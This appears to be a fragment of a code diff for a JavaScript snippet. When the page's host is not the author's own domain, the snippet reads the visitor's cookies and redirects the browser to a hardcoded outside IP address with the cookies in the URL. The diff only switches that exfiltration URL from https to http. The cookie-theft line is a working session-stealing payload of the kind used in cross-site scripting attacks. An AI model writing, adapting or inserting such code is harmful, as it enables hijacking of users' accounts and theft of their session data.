@@ -6,5 +6,5 @@ if(location.host == “my_own_domain”){
 }
 else{ 
     var cookie = document.cookie; 
-document.location=“https://52.168.64.33:8001/?cookie="+cookie;
+document.location=“http://52.168.64.33:8001/?cookie="+cookie;
 }
